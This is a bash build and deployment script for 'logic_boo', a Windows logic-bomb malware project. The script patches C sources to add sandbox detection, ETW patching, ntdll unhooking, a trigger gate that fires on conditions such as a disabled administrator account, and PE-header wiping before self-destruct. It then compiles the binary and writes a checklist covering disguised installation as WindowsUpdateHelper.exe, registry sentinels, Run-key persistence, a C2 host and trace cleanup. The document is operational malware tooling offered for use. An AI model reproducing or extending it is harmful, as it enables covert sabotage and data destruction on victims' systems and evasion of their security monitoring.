# =============================================================================
# setup.sh — logic_boo build & deployment preparation script
#
# Platform : Linux / macOS (build host) → cross-compiles for Windows x64
# Requires : mingw-w64, sha256sum (or shasum on macOS), python3 (optional)
#
# What this script does:
#   1. Checks for required toolchain (MinGW-w64 gcc)
#   2. Applies insertion patches to boom.c and lb_payload.c
#      (idempotent — skips if already applied, detected via sentinel comment)
#   3. Generates the sentinel file (stage.dat) and computes its SHA-256,
#      then writes the hash into lb_trigger.c as LT_FILE_HASH_HEX
#   4. Writes the sentinel registry value name + key into lb_trigger.c
#      (no actual registry write — that happens on the target at deploy time)
#   5. Runs 'make release' to produce build/lb.exe
#   6. Prints a deployment checklist
#
# Usage:
#   chmod +x setup.sh
#   ./setup.sh [OPTIONS]
#
# Options:
#   --cc PATH       Path to MinGW-w64 gcc (default: x86_64-w64-mingw32-gcc)
#   --debug         Build with debug symbols instead of release
#   --no-patch      Skip applying boom.c / lb_payload.c patches
#   --no-sentinel   Skip generating stage.dat and hash injection
#   --help          Show this message
#
# Output:
#   build/lb.exe              — compiled payload
#   deploy/stage.dat          — sentinel file to copy to target
#   deploy/deploy_checklist   — text file with deployment steps
# =============================================================================

set -euo pipefail

# ── Defaults ─────────────────────────────────────────────────────────────────
CC_DEFAULT="x86_64-w64-mingw32-gcc"
BUILD_TYPE="release"
DO_PATCH=1
DO_SENTINEL=1
CC_PATH=""

# ── Colour helpers ────────────────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; NC='\033[0m'

info()  { echo -e "${CYAN}[INFO]${NC}  $*"; }
ok()    { echo -e "${GREEN}[ OK ]${NC}  $*"; }
warn()  { echo -e "${YELLOW}[WARN]${NC}  $*"; }
die()   { echo -e "${RED}[FAIL]${NC}  $*" >&2; exit 1; }

# ── Argument parsing ──────────────────────────────────────────────────────────
while [[ $# -gt 0 ]]; do
    case "$1" in
        --cc)          CC_PATH="$2";  shift 2 ;;
        --debug)       BUILD_TYPE="debug"; shift ;;
        --no-patch)    DO_PATCH=0; shift ;;
        --no-sentinel) DO_SENTINEL=0; shift ;;
        --help|-h)
            sed -n '2,/^# =\+$/p' "$0" | sed 's/^# \?//'
            exit 0
            ;;
        *) die "Unknown option: $1. Run with --help for usage." ;;
    esac
done

# ── Banner ────────────────────────────────────────────────────────────────────
echo ""
echo "============================================================"
echo "  logic_boo — build & deployment preparation"
echo "  Host : $(uname -s) $(uname -m)"
echo "  Date : $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
echo "============================================================"
echo ""

# ── Step 1: Verify working directory ─────────────────────────────────────────
info "Step 1: Checking working directory..."

REQUIRED_FILES=("boom.c" "lb_c2.c" "lb_payload.c"
                 "lb_evasion.c" "lb_evasion.h"
                 "lb_trigger.c" "lb_trigger.h"
                 "lb_c2.h" "Makefile")

for f in "${REQUIRED_FILES[@]}"; do
    if [[ ! -f "$f" ]]; then
        die "Required file missing: $f — run this script from the project root."
    fi
done
ok "All required files present."

# ── Step 2: Verify toolchain ──────────────────────────────────────────────────
info "Step 2: Checking MinGW-w64 toolchain..."

if [[ -z "$CC_PATH" ]]; then
    # Auto-detect: try common names
    for candidate in \
        x86_64-w64-mingw32-gcc \
        x86_64-pc-mingw32-gcc  \
        gcc; do
        if command -v "$candidate" &>/dev/null; then
            CC_PATH="$candidate"
            break
        fi
    done
fi

if [[ -z "$CC_PATH" ]]; then
    die "MinGW-w64 gcc not found. Install with:\n" \
        "  Ubuntu/Debian : sudo apt install mingw-w64\n" \
        "  macOS         : brew install mingw-w64\n" \
        "Then re-run with: ./setup.sh --cc /path/to/x86_64-w64-mingw32-gcc"
fi

CC_VERSION=$("$CC_PATH" --version 2>&1 | head -1)
ok "Compiler : $CC_PATH"
ok "Version  : $CC_VERSION"

# Check for a known-good version (gcc >= 9)
GCC_MAJOR=$("$CC_PATH" -dumpversion 2>/dev/null | cut -d. -f1)
if [[ "${GCC_MAJOR:-0}" -lt 9 ]]; then
    warn "gcc < 9 detected.  Inline asm stubs in lb_evasion.c require gcc >= 9."
    warn "Build may succeed but indirect syscall stubs may mis-assemble."
fi

# ── Step 3: Apply insertion patches to boom.c ─────────────────────────────────
if [[ "$DO_PATCH" -eq 1 ]]; then
    info "Step 3: Applying insertion patches..."

    # ── boom.c PATCH 1 — #include lines ──────────────────────────────────────
    SENTINEL_BOOM_INC='/* lb_evasion + lb_trigger — inserted by setup.sh */'

    if grep -qF "$SENTINEL_BOOM_INC" boom.c; then
        ok "boom.c PATCH 1 (includes) already applied — skipping."
    else
        # Insert after the last #include line
        python3 - <<'PYEOF'
import re, sys

path = 'boom.c'
src  = open(path).read()

insert = (
    '\n/* lb_evasion + lb_trigger — inserted by setup.sh */\n'
    '#include "lb_evasion.h"\n'
    '#include "lb_trigger.h"\n'
)

# Find the last #include line and insert after it
last_inc = list(re.finditer(r'^#include\s+[<"].*?[>"]', src, re.MULTILINE))
if not last_inc:
    sys.exit('boom.c: no #include lines found')

pos = last_inc[-1].end()
patched = src[:pos] + insert + src[pos:]
open(path, 'w').write(patched)
print('  Patched: boom.c PATCH 1 (includes)')
PYEOF
        ok "boom.c PATCH 1 (includes) applied."
    fi

    # ── boom.c PATCH 2 — main() preamble ─────────────────────────────────────
    SENTINEL_BOOM_MAIN='/* 0a. sandbox */'

    if grep -qF "$SENTINEL_BOOM_MAIN" boom.c; then
        ok "boom.c PATCH 2 (main preamble) already applied — skipping."
    else
        python3 - <<'PYEOF'
import re, sys

path = 'boom.c'
src  = open(path).read()

# Insert before the first occurrence of "config_load();" inside main()
insert = '''\
    /* 0a. sandbox */
    if (ev_sandbox_check()) return 0;

    /* 0b. AV/EDR evasion */
    ev_init();
    ev_patch_etw_ntdll();
    ev_unhook_ntdll();

    /* 0c. Trigger gate init */
    lt_init();

    '''

target = '    config_load();'
if target not in src:
    sys.exit('boom.c: anchor "config_load();" not found')

patched = src.replace(target, insert + target, 1)
open(path, 'w').write(patched)
print('  Patched: boom.c PATCH 2 (main preamble)')
PYEOF
        ok "boom.c PATCH 2 (main preamble) applied."
    fi
    
    # ── boom.c PATCH 3 — poll loop body ──────────────────────────────────────
    SENTINEL_BOOM_POLL='lt_evaluate()'

    if grep -qF "$SENTINEL_BOOM_POLL" boom.c; then
        ok "boom.c PATCH 3 (poll loop) already applied — skipping."
    else
        python3 - <<'PYEOF'
import re, sys

path = 'boom.c'
src  = open(path).read()

# Replace the fire-decision block inside the poll loop.
# Match from "int fire = 0;" up to and including "Sleep(60 * 1000);"
old_block = r'''        int fire = 0;

        /\* Trigger A: date/time \*/
        if \(trigger_datetime\(\)\)      fire = 1;

        /\* Trigger B: signal file override \*/
        if \(trigger_signal_file\(\)\)   fire = 1;

        /\* Trigger C: watched process present.*?\*/
        int proc_present = detect_process\(g_cfg\.watch_process\);
        int svc_running  = detect_service\(WATCH_SERVICE\);

        /\*.*?OR signal file alone overrides everything
         \*/
        if \(!trigger_signal_file\(\)\) \{
            fire = \(trigger_datetime\(\) && \(proc_present \|\| svc_running\)\) \? 1 : 0;
        \}

        if \(fire\) break;

        Sleep\(60 \* 1000\);  /\* check every 60 seconds \*/'''

new_block = '''\
        int fire = 0;

        /* Five-class pre-execution gate (lb_trigger).
         * Manual signal-file override bypasses all gates. */
        if (trigger_signal_file()) {
            fire = 1;   /* operator manual override */
        } else if (lt_evaluate() == LT_ARMED) {
            fire = 1;
        }

        if (fire) break;

        ev_sleep_jitter(60000);  /* jittered 60 s poll */'''

m = re.search(old_block, src, re.DOTALL)
if not m:
    sys.exit('boom.c: poll loop block not found (already patched or source changed)')

patched = src[:m.start()] + new_block + src[m.end():]
open(path, 'w').write(patched)
print('  Patched: boom.c PATCH 3 (poll loop)')
PYEOF
        ok "boom.c PATCH 3 (poll loop) applied."
    fi

    # ── lb_payload.c PATCH A — #include lines ────────────────────────────────
    SENTINEL_PAYLOAD_INC='/* lb_evasion + lb_trigger — inserted by setup.sh */'

    if grep -qF "$SENTINEL_PAYLOAD_INC" lb_payload.c; then
        ok "lb_payload.c PATCH A (includes) already applied — skipping."
    else
        python3 - <<'PYEOF'
import re, sys

path = 'lb_payload.c'
src  = open(path).read()

insert = (
    '\n/* lb_evasion + lb_trigger — inserted by setup.sh */\n'
    '#include "lb_evasion.h"\n'
    '#include "lb_trigger.h"\n'
)

last_inc = list(re.finditer(r'^#include\s+[<"].*?[>"]', src, re.MULTILINE))
if not last_inc:
    sys.exit('lb_payload.c: no #include lines found')

pos = last_inc[-1].end()
patched = src[:pos] + insert + src[pos:]
open(path, 'w').write(patched)
print('  Patched: lb_payload.c PATCH A (includes)')
PYEOF
        ok "lb_payload.c PATCH A (includes) applied."
    fi

    # ── lb_payload.c PATCH B — payload_run() gate guard ──────────────────────
    SENTINEL_PAYLOAD_GATE='pre-execution gate'

    if grep -qF "$SENTINEL_PAYLOAD_GATE" lb_payload.c; then
        ok "lb_payload.c PATCH B (gate guard) already applied — skipping."
    else
        python3 - <<'PYEOF'
import sys

path = 'lb_payload.c'
src  = open(path).read()

insert = '''\
    /* 0. Pre-execution gate */
    ev_init();
    ev_patch_etw_ntdll();
    ev_unhook_ntdll();
    if (lt_evaluate() != LT_ARMED) {
        log_write("payload: pre-execution gate HOLD — aborting");
        return;
    }
    log_write("payload: pre-execution gate ARMED");

    '''

target = '    /* 1. NT internals */'
if target not in src:
    sys.exit('lb_payload.c: anchor "/* 1. NT internals */" not found')

patched = src.replace(target, insert + target, 1)
open(path, 'w').write(patched)
print('  Patched: lb_payload.c PATCH B (gate guard)')
PYEOF
        ok "lb_payload.c PATCH B (gate guard) applied."
    fi

    # ── lb_payload.c PATCH D — ev_wipe_pe_header before selfdestruct ─────────
    SENTINEL_PAYLOAD_WIPE='ev_wipe_pe_header()'

    if grep -qF "$SENTINEL_PAYLOAD_WIPE" lb_payload.c; then
        ok "lb_payload.c PATCH D (PE wipe) already applied — skipping."
    else
        python3 - <<'PYEOF'
import sys

path = 'lb_payload.c'
src  = open(path).read()

target = '    selfdestruct();'
if target not in src:
    sys.exit('lb_payload.c: anchor "selfdestruct();" not found')

insert = '    ev_wipe_pe_header();\n'
patched = src.replace(target, insert + target, 1)
open(path, 'w').write(patched)
print('  Patched: lb_payload.c PATCH D (PE wipe before selfdestruct)')
PYEOF
        ok "lb_payload.c PATCH D (PE wipe) applied."
    fi

else
    warn "Step 3: --no-patch specified — skipping source patches."
fi

# ── Step 4: Generate sentinel file + inject SHA-256 hash ──────────────────────
if [[ "$DO_SENTINEL" -eq 1 ]]; then
    info "Step 4: Generating sentinel file (stage.dat)..."
    mkdir -p deploy

    # Generate a deterministic sentinel with a build timestamp + random nonce
    NONCE=$(python3 -c "import secrets; print(secrets.token_hex(16))")
    BUILD_TS=$(date -u '+%Y-%m-%dT%H:%M:%SZ')
    printf 'stage=%s\nbuild=%s\nnonce=%s\n' \
        "logic_boo-v1" "$BUILD_TS" "$NONCE" > deploy/stage.dat

    ok "stage.dat written: deploy/stage.dat"

    # Compute SHA-256
    if command -v sha256sum &>/dev/null; then
        HASH=$(sha256sum deploy/stage.dat | awk '{print $1}')
    elif command -v shasum &>/dev/null; then
        HASH=$(shasum -a 256 deploy/stage.dat | awk '{print $1}')
    else
        die "sha256sum / shasum not found — cannot compute sentinel hash."
    fi

    ok "SHA-256: $HASH"

    # Inject hash into lb_trigger.c
    python3 - "$HASH" <<'PYEOF'
import sys, re

path   = 'lb_trigger.c'
h      = sys.argv[1]
src    = open(path).read()

# Replace the LT_FILE_HASH_HEX define value
pat = r'(#define\s+LT_FILE_HASH_HEX\s*\\\s*\n\s*")[0-9a-f]{64}(")'
repl = r'\g<1>' + h + r'\g<2>'
new_src, n = re.subn(pat, repl, src)
if n == 0:
    # Try single-line form
    pat2  = r'(#define\s+LT_FILE_HASH_HEX\s+")([ 0-9a-f]{64})(")'
    new_src, n = re.subn(pat2, r'\g<1>' + h + r'\g<3>', src)
    if n == 0:
        sys.exit('lb_trigger.c: LT_FILE_HASH_HEX not found')

open(path, 'w').write(new_src)
print(f'  Injected hash into lb_trigger.c: {h}')
PYEOF
    ok "Hash injected into lb_trigger.c."

else
    warn "Step 4: --no-sentinel specified — skipping stage.dat generation."
fi

# ── Step 5: Build ─────────────────────────────────────────────────────────────
info "Step 5: Building (${BUILD_TYPE})..."

MAKE_TARGET="$BUILD_TYPE"
if [[ "$BUILD_TYPE" == "debug" ]]; then
    make CC="$CC_PATH"
else
    make release CC="$CC_PATH"
fi

if [[ ! -f build/lb.exe ]]; then
    die "Build failed — build/lb.exe not produced."
fi

EXE_SIZE=$(wc -c < build/lb.exe)
ok "Build succeeded: build/lb.exe (${EXE_SIZE} bytes)"

# ── Step 6: Deployment checklist ─────────────────────────────────────────────
info "Step 6: Writing deployment checklist..."
mkdir -p deploy

cat > deploy/deploy_checklist.txt <<CHECKLIST
====================================================================
logic_boo — Deployment Checklist
Generated : $(date -u '+%Y-%m-%d %H:%M:%S UTC')
Binary    : build/lb.exe  (SHA-256: $(sha256sum build/lb.exe 2>/dev/null | awk '{print $1}' || echo 'compute manually'))
====================================================================

PRE-DEPLOY (on build host)
  [ ] Verify build/lb.exe SHA-256 matches above
  [ ] Copy deploy/stage.dat to a USB or staging server
  [ ] Update lb_config.ini with target USERNAME, COMPUTERNAME, C2_HOST

ON TARGET MACHINE
  1. Write sentinel registry value:
       reg add HKLM\SOFTWARE\WindowsUpdateAgent /v LastSync /t REG_DWORD /d 1 /f

  2. Copy stage.dat to the sentinel path:
       copy stage.dat C:\ProgramData\wuh\stage.dat

  3. Verify stage.dat hash on target (PowerShell):
       Get-FileHash C:\ProgramData\wuh\stage.dat -Algorithm SHA256

     Expected: $(cat deploy/stage.dat 2>/dev/null | (command -v sha256sum &>/dev/null && sha256sum | awk '{print $1}' || echo "see stage.dat"))

  4. Deploy lb.exe to target (OPSEC: use legitimate-looking path):
       copy lb.exe C:\ProgramData\Microsoft\Windows\WindowsUpdateHelper.exe

  5. Verify lb_trigger conditions align:
       - Date is within arm/expiry window (lb_trigger.c: LT_TIME_ARM_* / LT_TIME_EXPIRE_*)
       - Target account (default: Administrator) is disabled/deleted, OR
         check is reversed in lb_trigger.c § 3 for "still active" logic
       - Service "wuauserv" is running (default event-based check)
       - VPN client indicator process matches LT_ENC_PROC in lb_trigger.c

  6. Run manually for first test (check lb_run.log for gate results):
       C:\ProgramData\Microsoft\Windows\WindowsUpdateHelper.exe

  7. Verify gate output:
       type C:\ProgramData\wuh\lb_run.log

  8. For persistence (already installed by boom.c persist_install()):
       Verify: HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
               "WindowsUpdateHelper" = "C:\ProgramData\...\WindowsUpdateHelper.exe"

POST-OPERATION CLEANUP
  [ ] Remove stage.dat from target
  [ ] Delete HKLM\SOFTWARE\WindowsUpdateAgent
  [ ] Delete lb_run.log
  [ ] Run wipe_dispatch() (automated via payload_run) or manually delete binary

====================================================================
CHECKLIST

ok "Deployment checklist: deploy/deploy_checklist.txt"

# ── Done ──────────────────────────────────────────────────────────────────────
echo ""
echo "============================================================"
echo -e "  ${GREEN}All steps complete.${NC}"
echo ""
echo "  Outputs:"
echo "    build/lb.exe                  — binary"
echo "    deploy/stage.dat              — sentinel file for target"
echo "    deploy/deploy_checklist.txt   — step-by-step deployment guide"
echo ""
echo "  Next: follow deploy/deploy_checklist.txt"
echo "============================================================"
echo ""